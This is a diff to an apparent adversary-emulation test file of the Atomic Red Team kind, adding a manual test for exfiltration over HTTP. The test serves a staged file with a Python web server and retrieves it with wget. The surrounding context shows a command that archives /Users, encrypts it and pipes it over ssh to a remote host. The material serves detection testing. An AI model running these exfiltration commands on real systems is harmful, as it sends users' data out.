@@ -50,3 +50,30 @@ atomic_tests:
     name: sh
     command: |
       tar czpf - /Users/* | openssl des3 -salt -pass ${password} | ssh ${user_name}@${domain} 'cat > /Users.tar.gz.enc'
+
+- name: Exfiltration Over Alternative Protocol - HTTP
+  description: |
+    A firewall rule (iptables or firewalld) will be needed to allow exfiltration on port 1337.
+
+  supported_platforms:
+    - macos
+    - centos
+    - ubuntu
+    - linux
+
+  executor:
+    name: manual
+    steps: |
+      1. Victim System Configuration:
+
+          mkdir /tmp/victim-staging-area
+          echo "this file will be exfiltrated" > /tmp/victim-staging-area/victim-file.txt
+
+      2. Using Python to establish a one-line HTTP server on victim system:
+
+          cd /tmp/victim-staging-area
+          python -m SimpleHTTPServer 1337
+
+      3. To retrieve the data from an adversary system:
+
+          wget http://VICTIM_IP:1337/victim-file.txt
